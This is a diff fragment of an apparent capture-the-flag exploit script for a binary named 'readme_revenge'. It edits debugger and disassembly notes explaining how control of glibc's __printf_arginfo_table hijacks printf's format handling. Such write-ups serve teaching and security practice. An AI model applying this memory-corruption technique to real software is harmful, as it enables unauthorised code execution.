@@ -39,12 +39,11 @@ $2 = 0x4141414141414141
 gef➤  print $rdx
 $3 = 0x73
 
-rax+rdx*8 --> __printf_arginfo_table + 's'*8 and we can control __printf_arginfo_table.
 
 [0x00000000]> pd 20 @ 0x45ad08
 |           ; DATA XREF from 0x00467aa8 (fcn.00467aa8)
 |           0x0045ad08    488b0d99cd2. mov rcx, [rip+0x25cd99] ; 0x00467aa8
-|           0x0045ad0f    488b04d1     mov rax, [rcx+rdx*8]
+|           0x0045ad0f    488b04d1     mov rax, [rcx+rdx*8] <-- __printf_arginfo_table['s']
 |           0x0045ad13    4885c0       test rax, rax
 |           0x0045ad16    0f84dcfcffff jz 0x45a9f8
 |           0x0045ad1c    488d4b40     lea rcx, [rbx+0x40]
@@ -60,6 +59,8 @@ if (__builtin_expect (__printf_function_table == NULL, 1)
     || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
                                     (&spec->info, 1, &spec->data_arg_type,
                                     &spec->size)) < 0)
+
+rcx+rdx*8 --> __printf_arginfo_table + 's'*8 and we can control __printf_arginfo_table.
 """
 
 r = process('./readme_revenge')
